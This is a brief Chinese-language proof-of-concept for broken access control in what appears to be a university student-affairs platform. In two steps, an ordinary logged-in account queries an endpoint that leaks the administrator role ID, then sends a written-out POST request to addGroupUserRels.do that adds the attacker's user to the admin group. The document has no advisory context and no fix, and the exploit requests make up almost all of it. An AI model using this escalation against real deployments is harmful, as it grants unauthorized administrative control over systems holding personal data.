1、普通账户登录，get请求,获取管理员optRole

```
GET /xsfw/sys/emapAuth/console/index/EMAP_SAPP_ROLE_RELATION_QUERY.do 
```

2、optRole的值填入groupid，将用户加入管理员组

```
POST /xsfw/sys/funauthapp/addGroupUserRels.do HTTP/1.1
Host: xxxx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0
Accept-Encoding: gzip, deflate
Cookie: NSC_JOqgyvhaegq01uld2umxhgbeip03kb0=ffffffff09489f1645525d5f4f58455e445a4a423660; JSESSIONID=4E02E62BAF22D983056D0026F696B1EB; amp.locale=zh_CN; iPlanetDirectoryPro=9ooI7z1OWnGuVbsHMfEo4e; MOD_AUTH_CAS=MOD_AUTH_ST-6911441-glTUq3zImn63a20MCp2Y1685408066696-7xMB-cas; route=c632af23b5d669509eca713579bf5e43; asessionid=2e67125e-0d8a-4fba-9735-909989cd0649; HWWAFSESID=79de6768003c59108f; HWWAFSESTIME=1685408067093
Content-Type: application/x-www-form-urlencoded
Content-Length: 45

groupId={optRole}}&userIds[]={用户id}
```


